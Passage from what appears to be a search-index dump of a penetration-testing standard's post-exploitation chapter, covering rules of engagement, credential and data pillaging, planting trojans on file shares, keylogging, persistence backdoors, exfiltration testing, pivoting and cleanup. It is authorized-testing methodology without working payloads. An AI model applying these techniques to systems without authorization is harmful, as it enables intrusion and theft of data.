list should be included as an appendix to the final report. *Any and all private and/or personal user data (including passwords and system history) uncovered during the course of the penetration test may be used as leverage to gain further permissions or to execute other actions related to the test only if the following conditions are met: **The client\u2019s Acceptable Use Policy states all systems are owned by the client and all data stored on those systems are the property of the client. **The Acceptable Use Policy states connection to the client\u2019s network is considered consent for the connected machine to be searched and analyzed (including all present data and configurations). **The client has confirmation that all employees have read and understand the Acceptable Use Policy. *Passwords (including those in encrypted form) will not be included in the final report, or must be masked enough to ensure recipients of the report cannot recreate or guess the password. This is done to safeguard the confidentiality of the users the passwords belong to, as well as to maintain the integrity of the systems they protect. *Any method or device used to maintain access to compromised systems and that could affect the proper operation of the system or whose removal may cause downtime may not be implemented without the prior written consent of the client. *Any method or device which is used to maintain access to compromised systems must employ some form of user authentication such as digital certificates or login prompts. A reverse connection to a known controlled system is also acceptable. *All data gathered by the testers must be encrypted on the systems used by the testers. *Any information included in the report that could contain sensitive data (screenshots, tables, figures) must be sanitized or masked using techniques that render the data permanently unrecoverable by recipients of the report. *All data gathered will be destroyed once the client has accepted the final report. Method used and proof of destruction will be provided to the client. *If data gathered is regulated by any law, the systems used and their locations will be provided by the client to ensure that the data collected and processed does not violate any applicable laws. If the systems will be those of the penetration testing team the data may not be downloaded and stored on to their systems and only proof of access will be shown (File Permissions, Record Count, file names..etc). *Third party services for password cracking will not be used, nor will there be sharing of any other type of data with third parties without the clients prior consent. *If evidence of a prior compromise if found in the assessed environment all logs with actions and times recorded during the assessment by the penetration team will be saved, hashed and provided to the client. The client can then determine how best to respond to and handle the incident response. *No logs should be removed, cleared or modified unless specifically authorized to do so by the client in the engagement contract/statement of work. If authorized, the logs must be backed up prior to any changes. Protecting Yourself Due to the nature of a penetration test, you must ensure that you cover all your bases when dealing with the client and the tasks you will be performing. Discuss the following with the client to ensure a clear understanding of the roles and responsibilities of both client and provider prior to beginning any work. *Ensure that the contract and/or statement of work signed by both the client and provider that the actions taken on the systems being tested are on behalf and in representation of the client. *Obtain a copy of the security policies that govern user use of company systems and infrastructure (often referred to as \"Acceptable Use\" policies) prior to starting the engagement. Verify that policy covers: **Personal use of equipment and storage of personal employee data on the client systems and ownership and rights on that data. **Ownership of data stored on company equipment. *Confirm regulations and laws that govern the data that is managed and used by the client on their systems and the restrictions imposed on such data. *Use full drive encryption for those systems and removable media that will receive and store client data. *Discuss and establish with the client the procedures to follow in the case that a compromise from a third party is found. *Check for laws concerning the capture and/or storage of audio and video since the use of this methods in post-exploitation may be considered a violation of local or country wiretap laws. Infrastructure Analysis Network Configuration The network configuration of a compromised machine can be used to identify additional subnets, network routers, critical servers, name servers and relationships between machine. This information can be used to identify additional targets to further penetrate the client\u2019s network. Interfaces Identify all of the network interfaces on the machine along with their IP addresses, subnet masks, and gateways. By identifying the interfaces and settings, networks and services can be prioritized for targeting. Routing Knowledge of other subnets, filtering or addressing schemes could be leveraged to escape a segmented network, leading to additional hosts and/or networks to probe and enumerate. This data could come from a variety of sources on a particluar host or network including: *Interfaces *Routing tables, including static and dynamic routes *ARP Tables, NetBios or other network protocols used for service and host discovery. *For multi-homed hosts, determine if they are acting as a router. DNS Servers Identify all DNS servers in use, by assessing host settings. DNS servers and information could then be used to develop and execute a plan for discovering additional hosts and services on the target network. In the case that a DNS Server is compromised, the DNS database will provide valueable information about hosts and services that can be used to prioritize targets for the remainder of the assessment. The modification and addition of new records could be used to intercept the data of services depending on DNS. Cached DNS Entries Identify high value DNS entries in the cache, which may include login pages for Intranet sites, management interfaces, or external sites. Cached interfaces provide information of the most recent and most used host used by the compromised host providing a view of the relations and interactions of the hosts providing information that could be used to prioritization of targets for further penetration of the target network and infrastructure. Modification of cached entries if permitted can be used to capture authentication credential, authentication tokens or to gain further information on services used by the compromised hosts leading to further penetration of the target network. Proxy Servers Identify network and application level proxy servers. Proxy servers make good targets when in enterprise-wide use by the client. In the case of application proxies, it may be possible to identify, modify and/or monitor the flow of traffic, or the traffic itself. Proxy attacks are often an effective means to show impact and risk to the customer. ARP Entries Enumerate cached and static ARP table entries, which can reveal other hosts that interact with the compromised machine. Static ARP entries may represent critical machines. If the scope of the assessment allows for intercepting and modifying ARP entries, it is simple to show the possibility of disrupting, monitoring, or compromising a service in a manner that is usually not detected or protected against. Network Services Listening Services Identify all the network services offered by the target machine. This may lead to the discovery of services not identified by initial scanning as well as the discovery of other machines and networks. The identification of services not shown in scanning can also provide information on possible filtering and control systems implemented in the network and/or host. In addition, the tester may be able to leverage these services to compromise other machines. Most operating system include a method of identifying TCP and UDP connections made to and from the machine. By checking both connections to and from a compromised machine it is possible to find relationships that were previously unknown. As well as the host the service should also be considered, this may reveal services listening on non-standard ports and indicate trust relationships such as keyless authentication for SSH. VPN Connections All VPN connections into and out of the target machine or network should be identified. Outbound connections can provide paths into new systems which may have not previously been identified. Both inbound and outbound can identify new systems and possible business relationships. VPN connections often bypass firewalls and intrusion detection/prevention systems due to their inability to decrypt or inspect encrypted traffic. This fact makes VPNs ideal to launch attacks through. Any new targets should be verified as in scope before launching attacks against them. The presence of VPN client or server connections on the target host may also provide access to credentials previously not known that could be used to target other hosts and services. Directory Services A targeted host running directory services may provide an opportunity to enumerate user accounts, hosts and/or services that can be used in additional attacks or provide additional targets that may not have been previously discovered in the vulnerability analysis phase. Additionally, the details of users found in directory services could be used for Social Engineering and phishing campaign attacks, thus providing a possible higher success rate. Neighbors In todays network many services and operating systems use a number of protocols for neighbor discovery in an effort make the access of services, troubleshooting and configuration more convenient. Protocols vary depending on the type of target host. Networking equipment may use protocols like CDP (Cisco Discovery Protocol) and LLDP (Link Layer Discovery Protocol) to identify systems, configurations and other details to hosts directly connected to them or present in the same subnet. Similarly, desktop and server operating systems may use protocols like mDNS (Multicast Domain Name Service) and NetBios to find details of hosts and services in the same subnet. Pillaging Pillaging refers to obtaining information (i.e. files containing personal information, credit card information, passwords, etc.) from targeted hosts relevant to the goals defined in the pre-assessment phase. This information could be obtained for the purpose of satisfying goals or as part of the pivoting process to gain further access to the network. The location of this data will vary depending on the type of data, role of the host and other circumstances. Knowledge and basic familiarity with commonly used applications, server software and middleware is very important, as most applications store their data in many different formats and locations. Special tools may be necessary to obtain, extract or read the targeted data from some systems. Installed Programs Startup Items Most systems will have applications that can run at system startup or at user logon that can provide information about the purpose of the system, software and services it interacts with. This information may reveal potential countermeasures that could be in place that may hinder further exploitation of a target network and it\u2019s systems (e.g. HIDS/HIPS, Application Whitelisting, FIM). Information that should be gathered includes: *List of the applications and their associated versions installed on the system. *List of operating system updates applied to the system. Installed Services Services on a particular host may serve the host itself, or other hosts in the target network. It is necessary to create a profile of each targeted host, noting the configuration of these services, their purpose, and how they may potentially be used to achieve assessment goals or further penetrate the network. Security Services Security services comprise the software designed to keep an attacker out of systems, and keep data safe. These include, but are not limited to network firewalls, host-based firewalls, IDS/IPS, HIDS/HIPS and anti-virus. Identifying any security services on a single targeted host gives an idea of what to expect when targeting other machines in the network. It also gives an idea of what alerts may have been triggered during the test, which can be discussed with the client during the project debrief, and may result in updates to Security Policies, UAC, SELinux, IPSec, windows security templates, or other security rulesets/configurations. File/Printer Shares File and print servers often contain targeted data or provide an opportunity to further penetrate the target network and hosts. The information that should be targeted includes: *Shares offered by File Servers - Any file shares offered by target systems should be examined. Even just the names and comments of shares can leak important information about the names of internal applications or projects (i.e. if only \"Fred\" and \"Christine\" have access to the \"Accounting\" folder, perhaps they are both accounting employees). *Access Control Lists and permissions for shares. - From the client side, if it is possible to connect to the share, then it should be checked to see if the connection is read/only or read/write. Remember that if a share contains directories then different permissions may apply to different directories. From the server side both server configuration and file/directory permissions should be examined. *File share file and content listings *Identify files of interest from the file share listings. Look for interesting or targeted items such as: **Source Code **Backups **Installation Files **Confidential Data (financial data in spreadsheets, bank reports in TXT/PDF, password files, etc.) *Place trojans or autorun files - Using clever naming, or by mimicking naming conventions already in use, users can be encouraged to execute these payloads, allowing the tester to further penetrate the network. If file server logs can be obtained, specific users may even be targeted. Database Servers Databases contain a wealth of information that may be targeted in an assessment. *Databases - A list of database names can help the assessor to determine the purpose of the database and the types of data the database may contain. In an environment with many databases, this will help in prioritizing targets. *Tables - Table names and metadata, such as comments, column names and types can also help the assessor choose targets and find targeted data. *Table Content, row count for regulated content *Columns - It is possible in many databases to search all column names of all tables with a single command. This can be leveraged to find targeted data (e.g. If credit card data is targeted on an Oracle database, try executing ''select * from all_tab_columns where name # '%CCN%';''. *Database and Table Permissions *Database Users, Passwords, Groups and Roles The information hosted on databases can be also be used to show risk, achieve assessment goals, determine configuration and function of services or to further penetrate a client network and hosts. Directory Servers The main goals of a directory service is to provide information to services and hosts for reference or/and authentication. The compromise of this service can allow the control of all hosts that depend on the service and well as provide information that could be used to further an attack. Information to look for in a directory service are: *List of objects (Users, passwords, Machines..etc) *Connections to the system *Identification of protocols and security level Name Servers Name server provide resolution to host and services depending on the types of records it servers. Enumeration of records and controls can provide a list of targets and services to prioritize and attack to further penetrate a clients network and hosts. The ability to modify and add records can be use to show risk of denial of services as well as aid in the interception of traffic and information on a customer network. Deployment Services Identification of deployment services allows for the access and enumeration of: *Unattended answer files *Permission on files *Updates included *Applications and versions This information can be used to further penetrate a client network and hosts. The ability to modify the repositories and configuration of the service allows for *Backdoor installation *Modification of services to make them vulnerable to attack Certificate Authority Identification of Certificate Authority services on a compromised client host will allow for the access to *Root CA *Code Signing Certificates *Encryption and Signing Certificates Control of the service will also allow for the *Creation of new certificates for several tasks *Revocation of certificates *Modification of the Certificate Revocation List *Insertion of Root CA Certificate The control of the services shows risk and allows for the compromise of data and services on a client\u2019s network and hosts. Source Code Management Server Identification of source code management systems via by the service running on the compromised host or the client part of the service provides the opportunity for: *Enumerate projects - The project names can give away sensitive information on company projects. *Verify access to source code files *Modify source code files - If it is allowed in scope then modifying source code proves that an attacker could make changes that would affect the system *Enumerate developers - Developers details can be use for social engineering attacks as well as as inputs for attacking other areas of the system *Enumerate configuration Dynamic Host Configuration Server Identification of dynamic host configuration service or use of the service by the compromised host allows for: *Enumeration leases given *Enumeration configuration *Enumeration Options *Modification of configuration *Consumption of all leases The control of the service can be used to show risk of denial of service and for use in man in the middle attacks of hosts and services on the compromised network. Virtualization Identification virtualization services or client software allow for: *Enumerate Virtual Machines (name, configurations, OS) *Enumerate passwords and digital certificates for administration systems. *Enumerate virtualization software configuration *Configuration of Hosts *Show risk of denial of service with control of VM state *Access to data hosted on VM\u2019s *Interception of traffic of virtual hosts or services hosted on the compromised host Messaging Identification of services or client software for messaging provides the opportunity to *Identify Directory Services *Compromise of credentials *Access to confidential information *Identification of hosts on the network *System and business relationships All of this information and actions can be used to show risk and to further penetrate a client\u2019s network and hosts. Monitoring and Management Identification of services or client software for the purpose of monitoring and/or management may provide identification of additional servers and services on the target network, in addition the configuration parameters gained may provide access to other targets host and to determine what actions performed by the tester can be detected by the client. Some services to look for: *SNMP (Simple Network Management Protocol) *Syslog Some Management Services and Software to look for to gain credentials, identify host and gain access to other services may be: *SSH Server/Client *Telnet Server/Client *RDP (Remote Desktop Protocol) Client *Terminal Server *Virtual Environment Management Software Backup Systems Identification of services or client software for the purpose of backing up data provide a great opportunity to an attacker since these system require access to the data and systems they need to backup providing an attacker: *Enumeration of hosts and systems *Enumeration of services *Credentials to host and/or services *Access to backup data The information gained from the service can be used to show risk to the confidentiality, integrity and access tot he system and their information. Access to the backups can also provide opportunity to introduce miss configuration, vulnerable software or backdoors in to the clients systems. Networking Services (RADIUS,TACACS..etc) Identification of services or use of networking services allows for the: *Enumeration of users *Enumeration of hosts and systems *Compromise of credentials *Show risk of denial of service if alternate methods are not present Sensitive Data Key-logging By monitoring key strokes it is possible to detect sensitive information including passwords and PII - Don\u2019t know what the legality of this is if the user is say chatting on private IM while also using company software, anyone know? If the company says that all data on the network can be monitored then this should be ok. If the second bullet point in Protect Yourself is present and it states that use of equipment can be monitored and no personal use is permitted yes, if policy does not cover personal user or ownership of data, no. It should be extended to cover Network also. Screen capture Screen capture can be use to show evidence of compromise as well as access to information that can shown on the screen and access thru other means is not possible. Great care should be taken with the data collected thru screen capture so as to nor show private data of employees of customers of the client. Network traffic capture Network traffic capture can be used depending on the controls on the network and medium used for capture can be used to: *Identify hosts on the network *Intercept data *Identify services *Identify relations between hosts in the network *Capture of credentials Care should be taken to only capture traffic covered under the scope of the engagement and that the information captured does not fall under the control of local laws like the capture of Voice Over IP calls. Information retained and shown should be filtered so as to protect client\u2019s customer and/or employee personal and confidential data. Previous Audit reports User Information In this section the main focus is on the information present on the target system related to user accounts either present on the system or that have connected remotely and have left some trace that the personnel performing the assessment can gather and analyze for further penetration or provide the desired goal of the assessment. On System General information that can be gather on a compromised system are: History files - History files store recent commands the user has executed. Reading through these can reveal system configuration information, important applications, data locations and other system *sensitive information. *Encryption Keys (SSH, PGP/GPG) *Interesting Documents (.doc/x, .xls/x , password. ) - Users often store passwords and other sensitive information in clear text documents. These can be located in two ways, either searching through file names for interesting words, such as password.txt, or searching through the documents themselves. Indexing services can help with this, for example the Linux locate database. *User specific application configuration parameters *Individual Application History (MRU Windows only, history files..etc) *Enumerate removable media *Enumerate network shares / domain permission (gpresult) Web Browsers Information that can be gathered from web browsers that can be use to identify other hosts and systems as well as provide information to further penetrate a client\u2019s network and hosts are: *Browser History *Bookmarks *Download History *Credentials *Proxies *Plugins/Extensions Great care should be taken that only data in scope for the engagement is capture since the information from a web browser may contain client\u2019s employee confidential and private data. This data should be filtered from the data returned and report. IM Clients Information that can be gathered from IM Clients on a compromised system is: *Enumerate Account Configuration (User, Password, Server, Proxy) *Chat Logs Great care should be taken that only data in scope for the engagement is capture since the information from a web browser may contain client\u2019s employee confidential and private data. This data should be filtered from the data returned and report. System Configuration Password Policy By enumerating the systems password policy the ability to brute force and crack passwords becomes much more efficient, for example knowing that the minimum password length is 8 characters you can remove any word less than 8 characters from a dictionary. Security Policies Configured Wireless Networks and Keys By finding the targets wireless information it becomes possible to launch physical attacks through the companies wifi when on site. It can also allow a fake AP to be set up to lure targets to connect when away from site. High Value/Profile Targets High value/profile targets can be identified and further expanded from the targets identified in the pre-engagement meetings thru the analysis of the data gathered from the compromised systems and the interactions of those systems and the services that run on them This view of the the operation and interactions of these high value/profile targets helps in the identification and measurement of of impact that can be gained to the business do to the data and processes and to the overall integrity of the client\u2019s infrastructure and services. Data Exfiltration Mapping of all possible exfiltration paths from each of the areas where access has been achieved, a full exfiltration paths should be created. This includes secondary and tertiary means of getting to the outside world (through different accessible subnetc, etc). Once the mapping is provided, the actual exfiltration testing should be commenced. Testing exfiltration paths Per exfiltration paths mapping, data should be exfiltrated from the organization being tested. This should already be covered in the [[Pre-engagement]] scoping and adequate infrastructure should have been setup which adheres to the customer's acceptable engagement policy (i.e. data being exfiltrated is usually exfiltrated to a server in the full control of the tester, and will access and ownership right to the tested organization). The exfiltration itself should simulate real-world exfiltration strategies used by the threat actors that correspond to the [[Threat Modeling Standard]] relevant for the organization (i.e. if criminal mostly then \"standard\" exfiltration using a staging area inside the network where data is archived inside zip/7z encrypted files and then sent to FTP/HTTP servers on the Internet, if a more sophisticated threat actor then using means that simulate such strategies and tactics used for exfiltration). Measuring control strengths When performing exfiltration testing, the main goal of the test is to see whether the current controls for detecting and blocking sensitive information from leaving the organization actually work, as well as exercise the response teams if anything has been detected in terms of how they react to such alerts and how are the events being investigated and mitigated. Persistence *Installation of backdoor that requires authentication. *Installation and/or modification of services to connect back to system. User and complex password should be used as a minimum; use of certificates or cryptographic keys is preferred where possible. (SSH, ncat, RDP). Reverse connections limited to a single IP may be used. *Creation of alternate accounts with complex passwords. *When possible backdoor must survive reboots. Further Penetration Into Infrastructure Pivoting is the action in which the tester will use his presence of on the compromised system to further enumerate and gain access to other systems on the client\u2019s infrastructure. This action can be executed from the compromised host it self using local resourced or tools uploaded to the compromised system. From Compromised System Actions that can be taken from a compromised system: *Upload tools *Use local system tools *ARP Scan *Ping Sweep *DNS Enumeration of internal network *Directory Services Enumeration *Brute force attacks *Enumeration and Management thru Management Protocols and compromised credentials (WinRM, WMI, SMB, SNMP..etc) *Abuse of compromised credentials and keys (Webpages, Databases..etc) *Execute Remote Exploits The action that will be executed will depend on the information needed to show specific risk and/or further penetrating the client's network and hosts. Regular planning sessions are recommended to re-evaluate the information gather and decide the best approach to continue the post exploitation until the set goals are meet. Thru Compromised System Actions that can be taken thru a compromised system: *Port Forwarding *Proxy to internal network (SSH) *VPN to internal network *Execute Remote Exploit *Abuse of compromised credentials and keys (Webpages, Databases..etc) The action that will be executed will depend on the information needed to show specific risk and/or further penetrating the client's network and hosts. Regular planning sessions are recommended to re-evaluate the information gather and decide the best approach to continue the post exploitation until the set goals are meet. Cleanup The cleanup process covers the requirements for cleaning up systems once the penetration test has been completed. This will include all user accounts and binaries used during the test. *Remove all executable, scripts and temporary file from a compromised system. If possible use secure delete method for removing the files and folders. *Return to original values system settings and application configuration parameters if they where modified during the assessment. *Remove all backdoors and/or rootkits installed. *Remove any user accounts created for connecting back to compromise systems.","title":"Post Exploitation"},{"location":"pentest_standard/postexploration/#purpose","text":"The purpose of the Post-Exploitation phase is to determine the value of the machine compromised and to maintain control of the machine for later use. The value of the machine is determined by the sensitivity of the data stored on it and the machines usefulness in further compromising the network. The methods described in this phase are meant to help the tester identify and document sensitive data, identify configuration settings, communication channels, and relationships with other network devices that can be used to gain further access to the network, and setup one or more methods of accessing the machine at a later time. In cases where these methods differ from the agreed upon Rules of Engagement, the Rules of Engagement must be followed.","title":"Purpose"},{"location":"pentest_standard/postexploration/#rules-of-engagement","text":"The following Rules of Engagement are specific to the Post-Exploitation phase of a penetration test and are intended to ensure that the client\u2019s systems are not subjected to unnecessary risk by the (direct or indirect) actions of the testers and to ensure a mutually agreed procedure to follow during the post-exploitation phase of the project.","title":"Rules of Engagement"},{"location":"pentest_standard/postexploration/#protect-the-client","text":"The following rules are to be used as a guideline of rules to establish with a client to ensure that the day to day operations and data of the client are not exposed to risk: *Unless previously agreed upon, there will be no modification of services which the client deems \u201ccritical\u201d to their infrastructure. The purpose of modifying such services would be to demonstrate to the client how an attacker may: **Escalate privileges **Gain access to specific data **Cause denial of service *All modifications, including configuration changes, executed against a system must be documented. After finishing the intended purpose of the modification, all settings should be returned to their original positions if possible. The list of changes should be given to the client after the engagement to allow them to ensure all changes were properly undone. Changes that could not be returned to their original positions should be clearly differentiated from changes that were successfully reversed. *A detailed list of actions taken against compromised systems must be kept. The list should include the action taken and the time period in which it occurred. Upon completion, this list should be included as an appendix to the final report. *Any and all private and/or personal user data (including passwords and system history) uncovered during the course of the penetration test may be used as leverage to gain further permissions or to execute other actions related to the test only if the following conditions are met: **The client\u2019s Acceptable Use Policy states all systems are owned by the client and all data stored on those systems are the property of the client. **The Acceptable Use Policy states connection to the client\u2019s network is considered consent for the connected machine to be searched and analyzed (including all present data and configurations). **The client has confirmation that all employees have read and understand the Acceptable Use Policy. *Passwords (including those in encrypted form) will not be included in the final report, or must be masked enough to ensure recipients of the report cannot recreate or guess the password. This is done to safeguard the confidentiality of the users the passwords belong to, as well as to maintain the integrity of the systems they protect. *Any method or device used to maintain access to compromised systems and that could affect the proper operation of the system or whose removal may cause downtime may not be implemented without the prior written consent of the client. *Any method or device which is used to maintain access to compromised systems must employ some form of user authentication such as digital certificates or login prompts. A reverse connection to a known controlled system is also acceptable. *All data gathered by the testers must be encrypted on the systems used by the testers. *Any information included in the report that could contain sensitive data (screenshots, tables, figures) must be sanitized or masked using techniques that render the data permanently unrecoverable by recipients of the report. *All data gathered will be destroyed once the client has accepted the final report. Method used and proof of destruction will be provided to the client. *If data gathered is regulated by any law, the systems used and their locations will be provided by the client to ensure that the data collected and processed does not violate any applicable laws. If the systems will be those of the penetration testing team the data may not be downloaded and stored on to their systems and only proof of access will be shown (File Permissions, Record Count, file names..etc). *Third party services for password cracking will not be used, nor will there be sharing of any other type of data with third parties without the clients prior consent. *If evidence of a prior compromise if found in the assessed environment all logs with actions and times recorded during the assessment by the penetration team will be saved, hashed and provided to the client. The client can then determine how best to respond to and handle the incident response. *No logs should be removed, cleared or modified unless specifically authorized to do so by the client in the engagement contract/statement of work. If authorized, the logs must be backed up prior to any changes.","title":"Protect the Client"},{"location":"pentest_standard/postexploration/#protecting-yourself","text":"Due to the nature of a penetration test, you must ensure that you cover all your bases when dealing with the client and the tasks you will be performing. Discuss the following with the client to ensure a clear understanding of the roles and responsibilities of both client and provider prior to beginning any work. *Ensure that the contract and/or statement of work signed by both the client and provider that the actions taken on the systems being tested are on behalf and in representation of the client. *Obtain a copy of the security policies that govern user use of company systems and infrastructure (often referred to as \"Acceptable Use\" policies) prior to starting the engagement. Verify that policy covers: **Personal use of equipment and storage of personal employee data on the client systems and ownership and rights on that data. **Ownership of data stored on company equipment. *Confirm regulations and laws that govern the data that is managed and used by the client on their systems and the restrictions imposed on such data. *Use full drive encryption for those systems and removable media that will receive and store client data. *Discuss and establish with the client the procedures to follow in the case that a compromise from a third party is found. *Check for laws concerning the capture and/or storage of audio and video since the use of this methods in post-exploitation may be considered a violation of local or country wiretap laws.","title":"Protecting Yourself"},{"location":"pentest_standard/postexploration/#infrastructure-analysis","text":"","title":"Infrastructure Analysis"},{"location":"pentest_standard/postexploration/#network-configuration","text":"The network configuration of a compromised machine can be used to identify additional subnets, network routers, critical servers, name servers and relationships between machine. This information can be used to identify additional targets to further penetrate the client\u2019s network.","title":"Network Configuration"},{"location":"pentest_standard/postexploration/#interfaces","text":"Identify all of the network interfaces on the machine along with their IP addresses, subnet masks, and gateways. By identifying the interfaces and settings, networks and services can be prioritized for targeting.","title":"Interfaces"},{"location":"pentest_standard/postexploration/#routing","text":"Knowledge of other subnets, filtering or addressing schemes could be leveraged to escape a segmented network, leading to additional hosts and/or networks to probe and enumerate. This data could come from a variety of sources on a particluar host or network including: *Interfaces *Routing tables, including static and dynamic routes *ARP Tables, NetBios or other network protocols used for service and host discovery. *For multi-homed hosts, determine if they are acting as a router.","title":"Routing"},{"location":"pentest_standard/postexploration/#dns-servers","text":"Identify all DNS servers in use, by assessing host settings. DNS servers and information could then be used to develop and execute a plan for discovering additional hosts and services on the target network. In the case that a DNS Server is compromised, the DNS database will provide valueable information about hosts and services that can be used to prioritize targets for the remainder of the assessment. The modification and addition of new records could be used to intercept the data of services depending on DNS.","title":"DNS Servers"},{"location":"pentest_standard/postexploration/#cached-dns-entries","text":"Identify high value DNS entries in the cache, which may include login pages for Intranet sites, management interfaces, or external sites. Cached interfaces provide information of the most recent and most used host used by the compromised host providing a view of the relations and interactions of the hosts providing information that could be used to prioritization of targets for further penetration of the target network and infrastructure. Modification of cached entries if permitted can be used to capture authentication credential, authentication tokens or to gain further information on services used by the compromised hosts leading to further penetration of the target network.","title":"Cached DNS Entries"},{"location":"pentest_standard/postexploration/#proxy-servers","text":"Identify network and application level proxy servers. Proxy servers make good targets when in enterprise-wide use by the client. In the case of application proxies, it may be possible to identify, modify and/or monitor the flow of traffic, or the traffic itself. Proxy attacks are often an effective means to show impact and risk to the customer.","title":"Proxy Servers"},{"location":"pentest_standard/postexploration/#arp-entries","text":"Enumerate cached and static ARP table entries, which can reveal other hosts that interact with the compromised machine. Static ARP entries may represent critical machines. If the scope of the assessment allows for intercepting and modifying ARP entries, it is simple to show the possibility of disrupting, monitoring, or compromising a service in a manner that is usually not detected or protected against.","title":"ARP Entries"},{"location":"pentest_standard/postexploration/#network-services","text":"","title":"Network Services"},{"location":"pentest_standard/postexploration/#listening-services","text":"Identify all the network services offered by the target machine. This may lead to the discovery of services not identified by initial scanning as well as the discovery of other machines and networks. The identification of services not shown in scanning can also provide information on possible filtering and control systems implemented in the network and/or host. In addition, the tester may be able to leverage these services to compromise other machines. Most operating system include a method of identifying TCP and UDP connections made to and from the machine. By checking both connections to and from a compromised machine it is possible to find relationships that were previously unknown. As well as the host the service should also be considered, this may reveal services listening on non-standard ports and indicate trust relationships such as keyless authentication for SSH.","title":"Listening Services"},{"location":"pentest_standard/postexploration/#vpn-connections","text":"All VPN connections into and out of the target machine or network should be identified. Outbound connections can provide paths into new systems which may have not previously been identified. Both inbound and outbound can identify new systems and possible business relationships. VPN connections often bypass firewalls and intrusion detection/prevention systems due to their inability to decrypt or inspect encrypted traffic. This fact makes VPNs ideal to launch attacks through. Any new targets should be verified as in scope before launching attacks against them. The presence of VPN client or server connections on the target host may also provide access to credentials previously not known that could be used to target other hosts and services.","title":"VPN Connections"},{"location":"pentest_standard/postexploration/#directory-services","text":"A targeted host running directory services may provide an opportunity to enumerate user accounts, hosts and/or services that can be used in additional attacks or provide additional targets that may not have been previously discovered in the vulnerability analysis phase. Additionally, the details of users found in directory services could be used for Social Engineering and phishing campaign attacks, thus providing a possible higher success rate.","title":"Directory Services"},{"location":"pentest_standard/postexploration/#neighbors","text":"In todays network many services and operating systems use a number of protocols for neighbor discovery in an effort make the access of services, troubleshooting and configuration more convenient. Protocols vary depending on the type of target host. Networking equipment may use protocols like CDP (Cisco Discovery Protocol) and LLDP (Link Layer Discovery Protocol) to identify systems, configurations and other details to hosts directly connected to them or present in the same subnet. Similarly, desktop and server operating systems may use protocols like mDNS (Multicast Domain Name Service) and NetBios to find details of hosts and services in the same subnet.","title":"Neighbors"},{"location":"pentest_standard/postexploration/#pillaging","text":"Pillaging refers to obtaining information (i.e. files containing personal information, credit card information, passwords, etc.) from targeted hosts relevant to the goals defined in the pre-assessment phase. This information could be obtained for the purpose of satisfying goals or as part of the pivoting process to gain further access to the network. The location of this data will vary depending on the type of data, role of the host and other circumstances. Knowledge and basic familiarity with commonly used applications, server software and middleware is very important, as most applications store their data in many different formats and locations. Special tools may be necessary to obtain, extract or read the targeted data from some systems.","title":"Pillaging"},{"location":"pentest_standard/postexploration/#installed-programs","text":"","title":"Installed Programs"},{"location":"pentest_standard/postexploration/#startup-items","text":"Most systems will have applications that can run at system startup or at user logon that can provide information about the purpose of the system, software and services it interacts with. This information may reveal potential countermeasures that could be in place that may hinder further exploitation of a target network and it\u2019s systems (e.g. HIDS/HIPS, Application Whitelisting, FIM). Information that should be gathered includes: *List of the applications and their associated versions installed on the system. *List of operating system updates applied to the system.","title":"Startup Items"},{"location":"pentest_standard/postexploration/#installed-services","text":"Services on a particular host may serve the host itself, or other hosts in the target network. It is necessary to create a profile of each targeted host, noting the configuration of these services, their purpose, and how they may potentially be used to achieve assessment goals or further penetrate the network.","title":"Installed Services"},{"location":"pentest_standard/postexploration/#security-services","text":"Security services comprise the software designed to keep an attacker out of systems, and keep data safe. These include, but are not limited to network firewalls, host-based firewalls, IDS/IPS, HIDS/HIPS and anti-virus. Identifying any security services on a single targeted host gives an idea of what to expect when targeting other machines in the network. It also gives an idea of what alerts may have been triggered during the test, which can be discussed with the client during the project debrief, and may result in updates to Security Policies, UAC, SELinux, IPSec, windows security templates, or other security rulesets/configurations.","title":"Security Services"},{"location":"pentest_standard/postexploration/#fileprinter-shares","text":"File and print servers often contain targeted data or provide an opportunity to further penetrate the target network and hosts. The information that should be targeted includes: *Shares offered by File Servers - Any file shares offered by target systems should be examined. Even just the names and comments of shares can leak important information about the names of internal applications or projects (i.e. if only \"Fred\" and \"Christine\" have access to the \"Accounting\" folder, perhaps they are both accounting employees). *Access Control Lists and permissions for shares. - From the client side, if it is possible to connect to the share, then it should be checked to see if the connection is read/only or read/write. Remember that if a share contains directories then different permissions may apply to different directories. From the server side both server configuration and file/directory permissions should be examined. *File share file and content listings *Identify files of interest from the file share listings. Look for interesting or targeted items such as: **Source Code **Backups **Installation Files **Confidential Data (financial data in spreadsheets, bank reports in TXT/PDF, password files, etc.) *Place trojans or autorun files - Using clever naming, or by mimicking naming conventions already in use, users can be encouraged to execute these payloads, allowing the tester to further penetrate the network. If file server logs can be obtained, specific users may even be targeted.","title":"File/Printer Shares"},{"location":"pentest_standard/postexploration/#database-servers","text":"Databases contain a wealth of information that may be targeted in an assessment. *Databases - A list of database names can help the assessor to determine the purpose of the database and the types of data the database may contain. In an environment with many databases, this will help in prioritizing targets. *Tables - Table names and metadata, such as comments, column names and types can also help the assessor choose targets and find targeted data. *Table Content, row count for regulated content *Columns - It is possible in many databases to search all column names of all tables with a single command. This can be leveraged to find targeted data (e.g. If credit card data is targeted on an Oracle database, try executing ''select * from all_tab_columns where name # '%CCN%';''. *Database and Table Permissions *Database Users, Passwords, Groups and Roles The information hosted on databases can be also be used to show risk, achieve assessment goals, determine configuration and function of services or to further penetrate a client network and hosts.","title":"Database Servers"},{"location":"pentest_standard/postexploration/#directory-servers","text":"The main goals of a directory service is to provide information to services and hosts for reference or/and authentication. The compromise of this service can allow the control of all hosts that depend on the service and well as provide information that could be used to further an attack. Information to look for in a directory service are: *List of objects (Users, passwords, Machines..etc) *Connections to the system *Identification of protocols and security level","title":"Directory Servers"},{"location":"pentest_standard/postexploration/#name-servers","text":"Name server provide resolution to host and services depending on the types of records it servers. Enumeration of records and controls can provide a list of targets and services to prioritize and attack to further penetrate a clients network and hosts. The ability to modify and add records can be use to show risk of denial of services as well as aid in the interception of traffic and information on a customer network.","title":"Name Servers"},{"location":"pentest_standard/postexploration/#deployment-services","text":"Identification of deployment services allows for the access and enumeration of: *Unattended answer files *Permission on files *Updates included *Applications and versions This information can be used to further penetrate a client network and hosts. The ability to modify the repositories and configuration of the service allows for *Backdoor installation *Modification of services to make them vulnerable to attack","title":"Deployment Services"},{"location":"pentest_standard/postexploration/#certificate-authority","text":"Identification of Certificate Authority services on a compromised client host will allow for the access to *Root CA *Code Signing Certificates *Encryption and Signing Certificates Control of the service will also allow for the *Creation of new certificates for several tasks *Revocation of certificates *Modification of the Certificate Revocation List *Insertion of Root CA Certificate The control of the services shows risk and allows for the compromise of data and services on a client\u2019s network and hosts.","title":"Certificate 